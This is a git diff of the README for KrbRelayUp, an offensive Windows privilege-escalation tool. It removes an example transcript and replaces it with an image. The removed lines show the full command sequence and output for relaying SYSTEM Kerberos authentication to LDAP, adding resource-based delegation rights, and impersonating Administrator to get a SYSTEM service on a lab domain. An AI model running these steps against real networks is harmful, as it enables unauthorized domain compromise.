@@ -43,43 +43,9 @@ Usage: KrbRelayUp.exe krbscm <-s SERVICENAME> <-sc SERVICECOMMANDLINE>
 ```
 
 ### Examples
-```
-PS C:\Users\hodor\Desktop> .\KrbRelayUp.exe relay -Domain sevenkingdoms.local -CreateNewComputerAccount -ComputerName evilhost$ -ComputerPassword pass@123
-KrbRelayUp - Relaying you to SYSTEM
 
-[+] Computer account "evilhost$" added with password "pass@123"
-[+] Rewriting function table
-[+] Rewriting PEB
-[+] Init COM server
-[+] Register COM server
-[+] Forcing SYSTEM authentication
-[+] Got Krb Auth from NT/SYSTEM. Relying to LDAP now...
-[+] LDAP session established
-[+] RBCD rights added successfully
-[+] Run the spawn method for SYSTEM shell:
-    ./KrbRelayUp spawn -d sevenkingdoms.local -cn evilhost$ -cp pass@123
+![example](Images/example.png)
 
-PS C:\Users\hodor\Desktop> ./KrbRelayUp spawn -d sevenkingdoms.local -cn evilhost$ -cp pass@123
-KrbRelayUp - Relaying you to SYSTEM
-
-[+] TGT request successful!
-[+] Ticket successfully imported!
-[+] Building S4U2self
-[*] Using domain controller: KingsLanding.sevenkingdoms.local (192.168.80.128)
-[+] Sending S4U2self request to 192.168.80.128:88
-[+] S4U2self success!
-[+] Got a TGS for 'Administrator' to 'evilhost$@SEVENKINGDOMS.LOCAL'
-[+] Impersonating user 'Administrator' to target SPN 'HOST/WINTERFELL'
-[+] Building S4U2proxy request for service: 'HOST/WINTERFELL'
-[*] Using domain controller: KingsLanding.sevenkingdoms.local (192.168.80.128)
-[+] Sending S4U2proxy request to domain controller 192.168.80.128:88
-[+] S4U2proxy success!
-[+] Ticket successfully imported!
-[+] Using ticket to connect to Service Manger
-[+] KrbSCM Service created
-[+] KrbSCM Service started
-[+] Clean-up done
-```
 ### TODO
 - [ ] Code refactoring and cleanup!!!
 - [ ] Add ShadowCred attack as a RELAY method
